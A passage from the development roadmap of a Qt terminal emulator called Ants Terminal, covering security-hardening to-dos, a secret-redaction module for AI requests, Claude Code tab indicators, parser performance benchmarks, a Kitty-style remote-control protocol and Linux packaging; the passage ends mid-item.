- 📋 **Lua: reconcile resource-limit docs.** `PLUGINS.md:385-395` claims
  "per event invocation"; implementation is per-VM cumulative. Either
  implement per-handler reset or update the doc.
- 📋 **Session file: SHA-256 payload checksum.** `sessionmanager.cpp`
  currently has no payload integrity; an attacker with write access to
  `$XDG_DATA_HOME/ants-terminal/sessions/` can plant a crafted session
  that feeds arbitrary codepoints/fg/bg/flags into the grid.
- 📋 **Session file: pre-validate compressed length prefix before
  `qUncompress`.** A 500 MB claim in the header triggers a 500 MB
  allocation before the 100 MB cap fires.
- 📋 **Session file: `QDataStream::status()` checks inside cell loop.**
  `sessionmanager.cpp:149-163, 176-179` — truncated streams write
  uninitialized attrs into the grid.
- 📋 **Portal session close.** `GlobalShortcutsPortal` has no destructor
  / `Session::Close` call — session handle leaks for the process
  lifetime of the D-Bus client.
- 📋 **Cached dialog + dangling `&m_config`.** `mainwindow.cpp:1479`
  constructs `SettingsDialog(&m_config, this)` once; `onConfigFileChanged`
  reassigns `m_config = Config()`. Reopening Settings after an external
  edit of `config.json` dereferences a dangling reference. Fix: destroy
  cached dialog on config reload.
- 📋 **`WA_OpaquePaintEvent` on `m_menuBar`.** Missing per
  `tests/features/menubar_hover_stylesheet/spec.md` INV-3b.
- 📋 **SARIF emit suppressed findings with `suppressions[]` array.**
  `auditdialog.cpp:4823-4952` currently drops suppressed findings
  pre-export; SARIF v2.1.0 §3.35 expects them present with
  `kind: "external"` + `justification: reason`. Required for GitHub
  code-scanning / SonarQube reconciliation.
- 📋 **Audit: per-tool timeout override.** `auditdialog.cpp:3729` global
  30 s timeout; `cppcheck --enable=all` on a 500k-line codebase or
  `osv-scanner` rate-limited by OSV.dev both blow this. Add
  `timeoutMs` to `AuditCheck`.
- 📋 **Audit: incremental QProcess output drain.** `onCheckFinished`
  at `auditdialog.cpp:3747-3765` reads `readAllStandardOutput()` once;
  a runaway semgrep on generated code can buffer hundreds of MB before
  the timeout. Stream to a temp file with a size cap.
- 📋 **Audit: regex-DoS watchdog on user `drop_if_matches` /
  `.audit_allowlist.json`.** Qt PCRE has no native timeout; move
  user-supplied regex evaluation to `QtConcurrent` with a 2 s
  per-match watchdog.
- 📋 **Audit: widen `computeDedup` to 96 bits (24 hex chars).**
  `auditdialog.cpp:1914-1919`. Current 64-bit truncation exports to
  SARIF `primaryLocationLineHash`; a collision = wrong finding
  silently suppressed across scans.
- 📋 **Audit: distinguish "tool exited non-zero with empty stdout"
  from "tool reported no findings".** `auditdialog.cpp:3747` currently
  treats segfaults (stderr "Segmentation fault") as findings.
- 📋 **Concurrent-writer guard on `config.json` + `settings.local.json`.**
  No `flock` / lockfile today — two ants processes or ants + running
  Claude Code race on every save. Last write wins.
- 📋 **`debug.log` 0600 perms.** `debuglog.cpp:72` opens append with
  default umask; log can contain keystrokes, API responses, HMAC
  material.
- ✅ **Claude transcript: 32 KB tail window → scan-for-first-newline +
  grow.** Shipped 0.7.14. Replaced the fixed 32 KB window +
  firstLine-skip with a doubling-grow loop (32 KB → 4 MiB cap) that
  trims the potentially-partial prefix line only when the buffer
  contains ≥ 2 newlines, guaranteeing real content remains for the
  parser.
- ✅ **Claude transcript: handle `thinking` content blocks.** Shipped
  0.7.14. `ClaudeTranscriptDialog::formatEntry` now renders `thinking`
  blocks as italicized, dimmed paragraphs so readers can tell them
  apart from the visible reply.
- ✅ **`decodeProjectPath` preserves hyphens.** Shipped 0.7.14.
  Rewrote as a greedy filesystem-probing walker: at each hyphen,
  prefer `/` if that directory exists, fall back to `-` if that
  exists instead, default to `/` otherwise. Preferred source of
  truth is still `extractCwdFromTranscript`; the new decoder is the
  last-resort fallback.

### 🔁 Follow-ups from the re-review checkpoint (2026-04-23)

The 8-agent re-review of the Tier 1 batch surfaced a second wave of
findings. The HIGH ones landed in the same commit (missed settings-
dialog site, SSH `Match exec` / `KnownHostsCommand`, AI bidi /
C1 / NEL / LS-PS stripping + preview-length parity). These are the
remainder, captured so they don't drop on the floor.

- ✅ **Config backup retention cap.** Shipped 0.7.12 (code) +
  0.7.15 (regression test). `rotateCorruptFileAside` prunes siblings
  beyond the newest 5; ranks on mtime, not filename timestamp.
  `config_parse_failure_guard` INV-5 plants 8 stale backups and
  confirms post-prune count.
- ✅ **Remote-control: cache gate decision at process start.** Shipped
  0.7.12. `mainwindow.cpp:799` uses `static const bool
  remoteControlGate = m_config.remoteControlEnabled()` so a second
  MainWindow doesn't re-read the flag.
- ✅ **Remote-control: behavioral gate test.** Shipped 0.7.15. Config
  round-trip assertion replaces the 0.7.12 grep-for-getter-name
  approach (a rename would have silently defeated the grep).
  Structural "start() lives inside a conditional" check retained
  as plain-substring lookback.
- ✅ **Remote-control: `filterControlChars` header comment.** Already
  accurate in `remotecontrol.h:70-79` — "Strip C0 control bytes"
  with explicit rationale for why C1 is the AI-dialog layer's job
  (C1 bytes are UTF-8 continuation, structurally can't be stripped
  at byte level).
- ✅ **Audit rule-pack trust: project-scoped store.** Shipped 0.7.13.
  Replaced the global `audit_trust_command_rules` bool with a
  `{canonical project_path → sha256(audit_rules.json)}` store
  (`Config::isAuditRulePackTrusted` / `trustAuditRulePack` /
  `untrustAuditRulePack`). Trusting one project no longer extends to
  siblings; any rule-pack edit invalidates trust.
- ✅ **Audit rule-pack trust: in-dialog UI surface.** Shipped 0.7.13.
  Skipped-rule count appears on the Detected-types row as an
  "Untrusted rules: N" badge with a tooltip explaining the opt-in
  path. Stderr `qWarning` retained for headless / CI invocations.
- ✅ **Audit rule-pack trust: regression test.** Shipped 0.7.13.
  `tests/features/audit_command_rule_trust/` locks seven invariants:
  default-untrusted, round-trip, hash-invalidation, project-scoping,
  symlink+trailing-slash canonicalization, idempotent untrust, and
  cross-instance persistence.
- ✅ **`/tmp/kwin_*.js` orphan cleanup.** Shipped 0.7.15.
  `MainWindow` ctor runs `sweepKwinScriptOrphansOnce()` — a
  once-per-process scan of `kwin_{pos,move,center}_ants_*.js` with
  an mtime older than 1 hour. Guarded by a `static bool` so a
  second MainWindow (File → New Window) doesn't re-sweep.
- ✅ **Plugin-manager `manifest.json` + themes `*.json` parse warnings.**
  Already implemented. `pluginmanager.cpp:146` + `themes.cpp:308`
  both emit `qWarning` with error string + byte offset when
  `QJsonDocument::fromJson` fails.
- ✅ **AI `sendRequest` context redaction (OWASP LLM06).** Shipped in
  [Unreleased]. New header-only module `src/secretredact.h` exposes
  `SecretRedact::scrub(QString) → {text, redactedCount}` with a
  14-shape priority-ordered regex set (AWS AKIA/ASIA; GitHub classic
  / OAuth / app / fine-grained PATs; Anthropic, OpenAI project + legacy;
  Slack, Stripe, JWT; `Bearer <token>`; generic
  `api_key=`/`token=`/`password=`/`secret=` assignments; multi-line
  PEM private-key blocks). `AiDialog::sendRequest` now scrubs both
  `m_terminalContext` and `userMessage` before either reaches the
  JSON body; the chat history's "You:" display keeps the
  pre-redaction text (redaction is a network-boundary concern, not a
  UX one). When `redactedCount > 0` the dialog appends a System note
  so the user knows the payload differs from what they saw/typed.
  Contract pinned by `tests/features/ai_context_redaction/spec.md`
  + 16-positive + 6-negative + source-grep feature test. Verified to
  fail against pre-fix source (5 grep invariants fail as expected)
  before locking.
- 📋 **AI `extractAndSanitizeCommand` language-hint heuristic.** The
  "strip first line if < 10 chars" heuristic eats any command whose
  first line is short (e.g. `foo\tbar`). Gate on
  `nl < 10 && !line.contains(' ') && !line.contains('\t')` — language
  IDs are single unbroken tokens.
- 📋 **Allowlist + settings-dialog feature-test analogs.** The
  parse-failure guard now lives at three sites (Config,
  ClaudeAllowlist saveSettings, SettingsDialog Install-hooks) but
  only Config has a behavioral test. Mirror for the other two.
- ✅ **Spec.md timestamp format drift.** Spec already uses
  `<ms_timestamp>` (line 51), matching the code. Roadmap bullet
  was stale.
- 📋 **`secureio.h` split.** Growing to straddle two concerns
  (perms + backup rotation). Before a third helper lands, split into
  `secureio.h` (perms + future zeroize) + `configbackup.h` (rotation).
- ✅ **Plan-mode regression-test tightening.** Shipped 0.7.15.
  `runToggleFreeTailPreservesState` now attaches a
  `QSignalSpy(&ci, &ClaudeIntegration::planModeChanged)` and asserts
  exactly one emission across both parse phases (seed triggers
  NotSet → plan; tail phase has zero permission-mode events and
  must not re-fire).

### 🎨 Claude Code UX — per-tab status indicator (user request 2026-04-23)

- ✅ **Per-tab Claude-Code activity indicator.** Shipped in
  [Unreleased]. New `ClaudeTabTracker` class (`src/claudetabtracker.
  {h,cpp}`) keys per-shell state by PID (not tab index — stable under
  reorder), shares the transcript-tail parser with the singleton
  `ClaudeIntegration` via a new static `parseTranscriptTail` helper
  (no code duplication). `ColoredTabBar::paintEvent` gained a second
  pass that calls an `IndicatorProvider` callback to render an 8 px
  dot at the leading edge of each tab — muted grey for Idle /
  Thinking, blue for ToolUse, green for Bash (distinct from generic
  ToolUse because it's the longest-running, highest-signal tool),
  cyan for Planning, violet for Compacting, bright orange with a
  white outline for AwaitingInput. Permission prompts route by the
  hook event's `session_id` (matched against the transcript
  filename's UUID basename) so a prompt emitted by Claude in tab 3
  lights up **tab 3's** glyph, not the currently-focused tab;
  scroll-scan detection carries the owning terminal pointer directly
  so it routes without session-id. Permission-prompt resolution
  (Allow / Deny / Add-to-allowlist), terminal scanner retraction,
  toolFinished, and sessionStopped all clear the flag. Tab hover
  tooltip shows "Claude: thinking…" / "Claude: Bash" / etc. so the
  user can disambiguate glyphs without switching tabs. Settings
  dialog (General tab) checkbox flips `claude_tab_status_indicator`
  (default on); change takes effect on next paint via the live
  config reload path without app restart. Contract locked by
  `tests/features/claude_tab_status_indicator/spec.md` + 11-invariant
  feature test. Stage 1 scope complete.

### 🎨 Claude Code UX — manual tab rename stomped (user request 2026-04-24)

- ✅ **Right-click "Rename Tab…" pins the label.** Shipped in
  [Unreleased]. The rename handler at `mainwindow.cpp:4284` wrote
  directly to `m_tabWidget->setTabText` without populating
  `m_tabTitlePins`; the `titleChanged` signal handler and the 2 s
  `updateTabTitles` tick both consult the pin map, so Claude Code's
  per-prompt OSC 0/2 title writes wiped the manual name within
  seconds. Rename now routes through `setTabTitleForRemote` (the
  rc_protocol `set-title` path) — non-empty names pin, empty names
  clear the pin and restore the format-driven / shell-driven label,
  giving the user an in-UI "un-rename" path that didn't exist
  before. Low-risk one-handler change; confirmed it fails cleanly
  against pre-fix source before locking. Locked by
  `tests/features/tab_rename_pin` (4 invariants: lambda calls
  `setTabTitleForRemote(…)`, no direct `setTabText`, empty-name
  path not guarded out, consumer-side `m_tabTitlePins.contains(…)`
  guards still present on both consumers).

### ⚡ / 🏗 Tier 3 — structural

- ✅ **VtParser `Print`-run coalescing.** Shipped 0.7.17. The SIMD
  fast-path now emits one `VtAction::Print` per safe-ASCII run
  carrying a `{printRun, printRunLen}` slice into the caller buffer.
  `TerminalGrid::handleAsciiPrintRun` batches per-row cell writes so
  `markScreenDirty`, combining-char erase, and the `cell()` clamp
  fire once per row instead of once per byte. Measured deltas on
  8 MiB bench corpora (lower is better): `ascii_print` 327 → 260 ms
  (−20% wall, +26% MB/s), `ansi_sgr` 291 → 255 ms (−12% wall, +14%
  MB/s). The ROADMAP-target 5–10× never materialized because the
  remaining per-byte cost is in the cell-write path
  (`memmove`-style row updates, scrollback, attribute assignment),
  not in VtAction construction. `newline_stream` and `utf8_cjk`
  unchanged — no safe-ASCII runs or no coalesce-applicable path.
  Lifetime invariant enforced: `VtStream::onPtyData` expands runs
  into per-byte Prints before queuing (batch outlives feed buffer);
  the direct-callback path keeps the coalesced form. Locked by
  `tests/features/vtparser_print_run_coalesce` (8 invariants over
  grid-state equivalence vs. the scalar byte-by-byte feed).
- 📋 **Scroll region perf: `std::rotate` for `scrollUp`/`scrollDown`.**
  `scroll_region_rotate/spec.md` exists; `terminalgrid.cpp:1504-1590`
  still uses `erase`/`insert` per-iteration. `CSI 100 S` on an 80-row
  screen = 8 000 `memmove`s.
- 📋 **`VtBatch` zero-copy across thread hop.** `vtstream.h:93` uses
  `const VtBatch &` in a queued signal — Qt copies regardless of
  const-ref. Wrap payload in `std::shared_ptr<const VtBatchData>`.
- 📋 **Renderer subsystem decision:** revive `glrenderer.cpp` via
  `createWindowContainer` *or* delete it. It's ~1 500 LoC of
  compiled-but-unreachable code that bit-rots silently. If reviving,
  fix the `GlyphQuad` UV-math bug (`glrenderer.cpp:378`: absolute vs
  delta naming collision), add `glGetError` checks, restore GL state
  on render exit, add HiDPI / `devicePixelRatio` handling, add
  premultiplied-alpha pipeline.
- 📋 **Settings dialog: dependency-UI enable gating.**
  `settingsdialog.cpp:268-286` (AI tab when `ai_enabled=false`),
  `:204` (auto-theme combos when auto off), `:234-238` (Quake hotkey
  when Quake off). Wire `toggled` → `setEnabled` on siblings.
- 📋 **Settings dialog: Cancel rollback for Profiles tab.**
  `settingsdialog.cpp:432-482` — profile Save/Delete/Load mutate
  `m_config` immediately; Cancel doesn't roll them back.
- 📋 **Settings dialog: `background_alpha` widget** (dep on the Tier 2
  wiring decision).
- 📋 **Settings dialog: Restore Defaults per-tab.**
- 📋 **Accessibility pass on chrome.** `mainwindow.cpp` chrome and
  `CommandPalette` / `TitleBar` buttons have no
  `setAccessibleName` / `setAccessibleDescription`. Screen readers
  hear "push button" with no label. First pass: one line per control.
- 📋 **AT-SPI introspection lane.** Automated check that every
  user-visible control carries an accessible name — run in CI on a
  canonical `TerminalWidget` + `MainWindow` + all dialogs.

### 📚 Sweep methodology — re-run before each minor tag

Adopt the following as a standing pre-release step:

1. Re-dispatch the 14-agent sweep via
   `general-purpose` subagents (one per subsystem listed in
   `CLAUDE.md`'s "Project Structure"), briefed with source paths +
   `CLAUDE.md` + `PLUGINS.md` + matching `tests/features/*/spec.md` +
   relevant external specs. Cost: ~15 subagent runs (~1 M tokens total
   for a full sweep).
2. Triage the HIGH/Medium findings into this ROADMAP under the active
   minor's section.
3. Anchor every regression test added during the fix cycle to an
   **external** signal (spec section, CVE, reviewer report), not the
   author's own reasoning. See the "Spec-first workflow" note below.

**Spec-first workflow for new features (starting with the first
Tier 1 fix):** write `tests/features/<name>/spec.md` *before* the
code, surface it to the user for sign-off, then implement. The
feature test validates the user-approved spec, not the author's
interpretation. Closes the self-graded-homework loop.

### 🧪 Future external-signal lanes (carry from the 2026-04-23 review)

- 📋 **vttest as a CI lane.** Thomas Dickey's public xterm test
  program. Highest signal-per-effort for VT conformance drift.
  Runs a canonical xterm-compliance corpus against our parser; any
  divergence is a finding anchored to a published spec.
- 📋 **Differential screen-dump harness vs xterm/kitty.** Send a
  canonical byte-stream corpus to each, capture final screen state,
  diff. Divergences are findings regardless of what our unit tests
  say.
- 📋 **libFuzzer target against `VtParser`.** Feed random bytes,
  assert invariants (no crash, cursor bounded, scrollback bounded,
  combining side-table aligned). Mechanical — surfaces cases the
  author can't imagine.
- 📋 **Real-TUI smoke lane.** `vim`, `tmux`, `htop`, `neovim` in a
  headless session, snapshot screen, compare across releases.

---

## 0.8.0 — multiplexing + marketplace (target: 2026-08)

**Theme:** big new capabilities. This is the "features you'd expect from
a modern terminal" release.

### 🐛 Carried over from 0.7.x

- 💭 **Menubar dropdown flicker on mouse movement.** Partially reduced
  by 0.7.5 (`NoAnimStyle` killed Fusion's 60 Hz `QPropertyAnimation`
  cycle) and the 0.7.5+1 follow-up commit `04f3409` (extended
  intra-action suppression to `HoverMove`/`HoverEnter`/`HoverLeave`).
  Residual flicker still visible to the user on mouse motion over an
  open dropdown. Measured state on 2026-04-20: idle-log event volume
  is clean, but a ~85 Hz `UpdateRequest` → paint cascade persists
  even with `paintEvent()` forced to no-op (`ANTS_SKIP_PAINT=1`) and
  `WA_TranslucentBackground` disabled (`ANTS_OPAQUE_WINDOW=1`),
  which points at KWin's compositor sync handshake driving the
  cycle rather than anything in our widget tree. Likely next-angle
  fixes: (a) request KWin skip the blur-behind effect for our popup
  QMenus (empty `_KDE_NET_WM_BLUR_BEHIND_REGION` property);
  (b) disable `Qt::WA_Hover` on `QMenuBar` while a dropdown is open
  so the style engine stops re-evaluating `:hover` on every cursor
  tick; (c) test under GNOME/Mutter and i3 to confirm KWin is the
  amplifier. Not a blocker (user-reported as "not the biggest issue")
  but tracked so the 0.7.x fix attempts don't get re-invented.

### ⚡ Performance

- 🚧 **Terminal throughput slowdowns** (user report 2026-04-20).
  Intermittent stalls observed during normal use. Investigation items:
  (a) profile `onVtBatch()` under heavy-output workloads — `yes`,
  `dd`, `find /`, build logs — and identify hotspots;
  (b) audit `TerminalGrid::processAction` for O(n) allocations on
  each Print (the hot path);
  (c) check whether the async batch drain ack (`drainAck`) under
  back-pressure is creating producer-consumer sawtooth rather than
  steady flow; (d) measure paint time at 2000+ line scrollback with
  ligatures on vs off; (e) check the focus-redirect lambda and other
  `QApplication::focusChanged` handlers for expensive work per event.
  - ✅ **Benchmark harness.** `tests/perf/bench_vt_throughput.cpp`
    drives four fixed corpora — `ascii_print`, `newline_stream`,
    `ansi_sgr`, `utf8_cjk` — through `VtParser` →
    `TerminalGrid::processAction` at release-level `-O2`, no GUI.
    Emits a CSV line per corpus with bytes, actions, wall-ms,
    MB/s, actions/s. Registered under `ctest` label `perf`
    (excluded from the default `fast` suite). Run with
    `ctest -L perf --verbose` or directly; `ANTS_PERF_MB=64
    ./bench_vt_throughput` for a heavier sweep. **Baseline
    2026-04-20 on the dev laptop (4 MB per corpus):**

    | Corpus | MB/s | Actions/s | Note |
    |--------|-----:|----------:|------|
    | `ascii_print` | 23.3 | 24.4 M | Print-only; UTF-8 fast path |
    | `newline_stream` | 5.3 | 5.6 M | **4× slower — scroll/scrollback hotspot** |
    | `ansi_sgr` | 16.9 | 13.0 M | SGR dispatch |
    | `utf8_cjk` | 7.9 | 3.1 M | 3-byte UTF-8 + double-width |

    Top signal from the baseline: `newline_stream` is 4× slower
    than pure Print, pointing at `lineFeed()` →
    `TerminalGrid::scrollUp()` → scrollback deque insertion as
    the dominant cost. Matches sub-item (b) on the list above —
    next action is a `perf record`/`callgrind` run over
    `newline_stream` to confirm which `scrollUp` sub-step
    dominates (row allocation? per-line combining-char table
    copy? pushBack on the scrollback `std::deque`?).
  - ✅ **Main-thread stall detector** (`DebugLog::Perf`, enabled
    via `ANTS_DEBUG=perf`). 200 ms heartbeat `QTimer` that
    records every drift > 100 ms as a main-thread stall. Added
    after the follow-up user report 2026-04-20: "slow down
    experienced at various times, when tab has been clear or
    has had lots of text, not one specific scenario." The
    intermittent-and-content-independent signature points away
    from the PTY hot path and toward a periodic background
    handler (2 s status-bar `updateStatusBar` reading
    `.git/HEAD`, 2 s Claude-integration `/proc` walk, focus-
    redirect lambda, plugin callback, session save, file-system
    watcher fire). The detector fingerprints which one on the
    next reproduction — log line shape is `STALL: main-thread
    blocked for Nms (gap=..., interval=..., count=..., worst=...)`.
- 📋 **Dynamic grid storage** (Alacritty
  [PR #1584](https://github.com/alacritty/alacritty/pull/1584/files)).
  Don't pre-allocate the full `Vec<Vec<Cell>>` scrollback; lazily
  allocate row buffers; intern empty rows to a single shared sentinel.
  Alacritty's own data: 191 MB → 34 MB (20k-line scrollback).
- 📋 **Async image decoding**. Hand sixel/Kitty/iTerm2 payloads to
  `QtConcurrent::run`; render a placeholder cell until `QImage`
  future resolves. Big sixel frames stop blocking the prompt.
- 💭 **BTree scrollback** — O(log n) scroll-to-line instead of O(n)
  for jump-to-timestamp features.

### 🎨 Features — multiplexing

- 🚧 **Remote-control protocol** (Kitty-style,
  [docs](https://sw.kovidgoyal.net/kitty/rc_protocol/)): JSON envelopes
  over a Unix socket. Commands: `launch`, `send-text`, `set-title`,
  `select-window`, `get-text`, `ls`, `new-tab`. Auth via X25519 when
  a password is set. Unlocks scripting, IDE integration, CI.
  - ✅ **First slice: socket + envelope + `ls`.** `src/remotecontrol.{h,cpp}`
    brings up a `QLocalServer` on `$ANTS_REMOTE_SOCKET` (or the XDG
    runtime default `$XDG_RUNTIME_DIR/ants-terminal.sock`). Each
    connection is one-shot: read a single JSON line, dispatch, write
    the JSON response line, close. `ls` returns
    `{"ok": true, "tabs": [{"index", "title", "cwd", "active"}, ...]}`.
    Unknown commands return `{"ok": false, "error": "unknown command: ..."}`
    with exit code 2. The same binary handles client mode via
    `--remote <cmd>` (optionally `--remote-socket <path>`) — no
    separate client binary. Pinned by source-grep feature test
    `tests/features/remote_control_ls/` (8 invariants including
    field-name stability, env-var override, `--remote` ordering).
  - ✅ **`send-text` command.** Writes a UTF-8 string byte-for-byte to
    a tab's PTY master. `tab` field optional (active tab default),
    `text` required; response carries `bytes` written. Client CLI:
    `--remote-text <str>` or stdin pipe; `--remote-tab <i>` optional.
    Does not auto-append a newline (matches Kitty; callers include
    terminators explicitly). Pinned by
    `tests/features/remote_control_send_text/`.
  - ✅ **`new-tab` command.** Opens a fresh tab and returns its
    0-based index. `cwd` optional (inherits focused-terminal cwd);
    `command` optional (written via `writeCommand` after a 200 ms
    settle). Response: `{"ok":true,"index":<int>}`. Client CLI:
    `--remote-cwd <path>`, `--remote-command <str>`. Pinned by
    `tests/features/remote_control_new_tab/`.
  - ✅ **`select-window` command.** Switches the active tab to the
    0-based index given in the `tab` field (required). Focuses the
    new tab's terminal so follow-up `send-text` without an explicit
    tab lands correctly. Pinned by
    `tests/features/remote_control_select_window/`.
  - ✅ **`set-title` command.** Pins a tab label that survives both
    the per-shell `titleChanged` signal (OSC 0/2) and the 2 s
    `updateTabTitles` refresh. Empty title clears the pin and
    restores from `shellTitle()` (under `tabTitleFormat == "title"`)
    or rebuilds via the format-driven path. Pin freed at tab-close.
    Pinned by `tests/features/remote_control_set_title/`.
  - ✅ **`get-text` command.** Returns trailing N lines of
    (scrollback + screen) joined with `\n`. Default 100, capped
    server-side at 10 000 to bound the JSON envelope. Reuses
    `TerminalWidget::recentOutput()` — same accessor the AI dialog
    uses for context capture, so format stays consistent. Pinned
    by `tests/features/remote_control_get_text/`.
  - ✅ **`launch` command.** Convenience wrapper for `new-tab` +
    `send-text`, sugar for `idx=$(... new-tab) && ... send-text
    --remote-tab $idx ...`. `command` is required (rejects empty
    with a "use new-tab" hint); auto-appends `\n` so the command
    actually runs. Pinned by `tests/features/remote_control_launch/`.
    **Initial command surface complete** — 7/7. Remaining work in
    this item is the X25519 auth layer (currently 💭).
  - 💭 **Auth layer.** X25519 shared-secret when `$ANTS_REMOTE_PASSWORD`
    is set. Shipped after the command surface is complete.
- 📋 **Headless mux server with codec RPC**. WezTerm's architecture
  ([DeepWiki](https://deepwiki.com/wezterm/wezterm/2.2-multiplexer-architecture)):
  `ants-terminal --server` runs without a GUI and accepts attachments
  over a Unix socket; `ants-terminal --attach <socket>` reconnects.
  Panes survive window close. Sparse scrollback fetched on demand via
  `GetLines` RPC.
- ✅ **SSH ControlMaster** auto-integration from the SSH bookmark
  dialog. Shipped in 0.7.1. Connects opened from the SSH Manager
  carry `-o ControlMaster=auto`,
  `-o ControlPath=$HOME/.ssh/cm-%r@%h:%p`, and
  `-o ControlPersist=10m` when the new `ssh_control_master` config
  key is true (default). `$HOME` resolves in-process via
  `QDir::homePath()` so the ControlPath works under dash / POSIX
  `sh`; `%r@%h:%p` are OpenSSH tokens and survive shell quoting
  intact. Second tab to the same host opens in ms instead of
  seconds. See
  [CHANGELOG.md §0.7.1](CHANGELOG.md#071--2026-04-19).
- 💭 **Domain abstraction** à la WezTerm: `DockerDomain` lists
  `docker ps`, opens a tab via `docker exec -it`; `KubeDomain` lists
  pods, opens via `kubectl exec`. Reuses the SSH bookmark UI shell.
- 💭 **Persistent workspaces**: save/restore entire tab+split layout +
  scrollback to disk; one-click "resume yesterday's dev session."

### 🎨 Features — inline ghost-text completion

Claude Code's "as-you-type" completion pattern — you begin typing a
command (e.g. `/ind`), the rest of the best match (`ie-review`) is
shown inline in a dim/greyed color, and TAB commits it. This is
separate from a popup/dropdown picker — it's inline with the cursor,
zero-click, purely suggestive. Proposed in two scopes:

- 📋 **Command Palette ghost-completion (near-term, small scope).**
  The Command Palette (Ctrl+Shift+P) already has fuzzy-match wiring.
  As the user types, render the top match's unmatched suffix in a
  dimmed color inline with their input (roughly `palette[fg] * 0.45
  alpha`). TAB commits. Esc / any non-matching keystroke
  reshapes-or-cancels. Implementation lives entirely in
  `commandpalette.cpp`; probably ~100 LoC. This is the scope that
  matches the user-facing mental model of "like Claude Code's
  /slash-command autocomplete."
- 💭 **In-terminal shell ghost-suggestion (fish-shell style, bigger
  scope).** As the user types at the shell prompt, ghost-suggest
  from shell history — fish's killer UX feature. Requires two
  pieces: (a) prompt detection (OSC 133 already provides this —
  `A`/`B`/`C` markers bracket the command line), (b) a history
  source. Two options:
    - *Zero-shell-integration*: scrape `$HISTFILE` via inotify on
      `~/.bash_history` / `~/.zsh_history` / `~/.local/share/fish/fish_history`.
      Cross-shell, no user setup, but lags (history flushes on shell
      exit for bash/zsh).
    - *OSC-bridged*: introduce a new OSC payload
      (`OSC 133 ; D ; <command> ST` or similar) emitted by a shell
      plugin (shipped alongside Ants for bash/zsh/fish). Near-realtime,
      but requires shell-side setup.
  Render the ghost suggestion inline (rightward from the cursor) by
  injecting it into the terminal's own cursor-row painting — gated
  on OSC 133 A (we know we're on a prompt line), cleared on A again
  or on PTY output (user's shell re-printing over it).
  Non-trivial — touches `terminalgrid.cpp` paint path, `vtparser.cpp`
  (new OSC dispatch if shell plugin ships), new config keys
  (`ghost_completion_enabled`, `ghost_completion_source`). Defer to
  beyond 1.0 unless users ask.
- 💭 **Frequency-ranked completion source.** Either form benefits
  from "show the most-used match first, not just the alphabetically-
  first match." The Command Palette could track selection counts;
  the terminal form can lean on shell history ordering. Worth a
  mention but not a blocker for the initial implementation.

### 📦 Distribution readiness (H5–H7, H13)

Mid-term packaging work — this is where Ants moves from
"packageable-in-theory" to "actually installable on every major
distro." Each sub-bullet can ship independently once H1–H4 land.

- ✅ **H5 — ready-to-submit distro packaging files**. Shipped in
  0.6.20. Each recipe drives the existing CMake install rules with
  zero source patches and runs the audit-rule regression suite in
  its own test stage:
  - `packaging/opensuse/ants-terminal.spec` — openSUSE RPM spec
    targeting Tumbleweed. Uses core macros (`%cmake`,
    `%cmake_build`, `%cmake_install`, `%ctest`, `%autosetup`) so
    the file is close to portable to Fedora. BuildRequires
    declared via `cmake(Qt6*)` pkgconfig-style entries; `%files`
    enumerates all fifteen install paths explicitly so a missing
    artefact fails the OBS build instead of producing a
    silently-incomplete package. Submit via OBS to
    `devel:languages:misc` or a dedicated project; changelog lives
    in a separate `.changes` file per openSUSE convention.
  - `packaging/archlinux/PKGBUILD` — Arch AUR release recipe
    (`ants-terminal`). `check()` runs ctest; built against system
    Qt6 and lua. `sha256sums=('SKIP')` in-tree with a comment
    pointing packagers at `updpkgsums` once the upstream tag is
    live. The `-git` rolling variant is documented in
    `packaging/README.md` (three-line diff: `pkgname`, `source`,
    `pkgver()`).
  - `packaging/debian/` — `control`, `rules`, `changelog`,
    `copyright`, `source/format`. `debhelper-compat 13` drives
    `dh $@ --buildsystem=cmake` with Ninja as the backend; DEP-5
    `copyright` carries the full MIT license text;
    `DEB_BUILD_MAINT_OPTIONS = hardening=+all` stacks
    dpkg-buildflags' hardening wrappers on top of our CMake
    hardening flags. Suitable for `debuild -uc -us` or a Launchpad
    PPA; eventual target is ITP → official archive.
  - `packaging/README.md` — one-page build / submission guide for
    all three recipes.

  See [CHANGELOG.md §0.6.20](CHANGELOG.md#0620--2026-04-15).
- ✅ **H6 — Flatpak packaging**. Shipped in 0.7.2.
  `packaging/flatpak/org.ants.Terminal.yml` against
  `org.kde.Platform//6.7` (KDE SDK brings cmake/ninja/Qt6). The PTY
  path in `src/ptyhandler.cpp` detects `FLATPAK_ID` /
  `/.flatpak-info` in the forked child and exec's the user's shell
  via `flatpak-spawn --host` with explicit
  `--env=TERM/COLORTERM/TERM_PROGRAM/TERM_PROGRAM_VERSION/COLORFGBG`
  and `--directory=<workDir>` — the only workable PTY model inside a
  sandbox (same pattern Ghostty's Flathub build uses). `finish-args`
  cover Wayland/X11/DRI, network (AI endpoint + SSH), portals
  (global shortcuts), desktop notifications, and XDG config/data
  directories. Source-grep feature test
  (`tests/features/flatpak_host_shell/`) pins the branch shape:
  detection probes both signals in an OR, `--host` + `--`
  separators, every TERM var passes through as `--env=`, workDir
  gates on `isEmpty()`, direct-exec fallback is preserved verbatim.
  Lua plugins disabled in the initial manifest — `org.kde.Sdk`
  doesn't ship lua54 and tarball-sha256 refresh per release is a
  maintenance cost worth deferring; plugin support returns via a
  `shared-modules` Lua entry in a follow-up (H6.1 below). Flathub
  submission is the final step — manifest is ready to re-point
  `sources[].type: dir` → `git / url / tag` and PR against
  [flathub/flathub](https://github.com/flathub/flathub) (H6.2
  below). See [CHANGELOG.md §0.7.2](CHANGELOG.md#072--2026-04-19)
  and [packaging/flatpak/README.md](packaging/flatpak/README.md).
- ✅ **H6.1 — Lua plugins in Flatpak**. Shipped in 0.7.3. The
  manifest now carries an in-manifest Lua 5.4 `archive` module
  before `ants-terminal`, built from
  `https://www.lua.org/ftp/lua-5.4.7.tar.gz` with a pinned
  `sha256` and the `linux-noreadline` target (Ants only links
  `liblua.a` statically; readline would be bloat in the sandbox).
  `MYCFLAGS="-fPIC"` keeps the library PIE-safe for linking into
  the `ants-terminal` executable; installed to `/app` via
  `make install INSTALL_TOP=/app`, where CMake's `FindLua`
  searches by default. The `x-checker-data` stanza on the module
  is wired to
  [flatpak-external-data-checker](https://github.com/flathub/flatpak-external-data-checker)
  so Flathub CI auto-refreshes the `url` + `sha256` on each Lua
  5.4.x point release — no manual hash churn, and 5.5.x majors
  are excluded (they would break the in-source
  `find_package(Lua 5.4)` floor). `tests/features/flatpak_lua_module/`
  pins six invariants against the manifest YAML (module order,
  pinned sha256, `-fPIC`, install prefix, readline-free target,
